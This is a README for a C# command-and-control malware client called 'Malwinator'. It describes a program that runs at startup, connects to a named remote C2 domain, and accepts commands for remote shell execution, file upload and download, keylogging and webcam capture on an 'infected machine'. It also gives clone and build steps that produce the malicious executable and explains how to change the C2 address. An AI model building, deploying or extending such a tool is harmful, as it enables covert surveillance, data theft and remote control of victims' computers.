# C2 Client

## Description 
This is a malicious C# script that can handle a connection to the remote server (http://malwinator.chickenkiller.com). The script is intended to be run at startup and to try to establish a connection. After the connection is done it can handle some commands from the server:
- ping (to see if the infected machine is up and receiving commands)
- shell (to execute shell commands on the infected machine)
- download (to download a file from the remote server)
- upload (to upload a file on the remote server)
- log (to open the keylogger module)
- camera (to open the camera module)

#### Note:
If you want to change the C2 server address change the url from Program.cs and recompile.

## Usage

#### Requirements:
For this to work I suppose that dotnet is already installed on the system.

Folow the commands below:

```
git clone -b c2_client https://github.com/MarioUta/Malwinator.git
cd Malwerinator-educational-/C2_Client
dotnet publish -c Release
```

Now the malicious executable is created. The path to it is: .\bin\Release\net8.0\win-x64\publish\Program.exe
